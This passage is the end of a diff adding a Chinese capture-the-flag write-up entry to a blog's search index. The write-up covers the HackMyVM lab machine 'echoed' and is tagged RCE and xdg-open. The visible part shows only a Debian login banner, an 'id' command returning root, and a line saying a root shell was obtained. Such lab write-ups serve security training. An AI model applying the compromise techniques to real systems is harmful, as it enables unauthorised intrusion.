+Linux echoed <span class="token number">4.19</span>.0-12-amd64 <span class="token comment">#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec <span class="token number">17</span> 02:25:52 <span class="token number">2020</span>
+root@echoed:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root</code></pre>
+<p>拿到rootshell</p>
+]]></content>
+      <categories>
+        <category>HackMyVM</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>xdg-open</tag>
+      </tags>
+  </entry>
 </search>
